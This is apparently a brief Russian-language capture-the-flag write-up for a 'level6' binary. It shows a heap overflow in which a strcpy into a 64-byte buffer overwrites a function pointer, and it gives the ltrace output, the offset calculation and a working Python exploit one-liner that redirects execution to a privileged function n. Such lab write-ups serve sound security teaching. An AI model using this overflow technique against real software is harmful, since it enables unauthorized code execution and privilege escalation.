функция аллоцирует два пространства на 64 и 4 байта и копирует через strcpy аргумент в первое
затем запускает функцию располагающуюся на первом, при это адреса пространств:
ltrace ./level6
__libc_start_main(0x804847c, 1, 0xbffff7b4, 0x80484e0, 0x8048550 <unfinished ...>
malloc(64)                                                                                                                                                 = 0x0804a008
malloc(4)                                                                                                                                                  = 0x0804a050
разница между нами 0x50-0x8 = 0x48 = 72
следовательно если ввести более 72 симоволов в аргументе, можно будет переполнить его и изменить
пространство, с которого потом будет вызвана функция
в коде также существует функция  n, которая дает нам необходимый права, введем ее адрес
info functions n
0x08048454  n
./level6 $(python -c 'print "U" * 72 + "\x54\x84\x04\x08"')
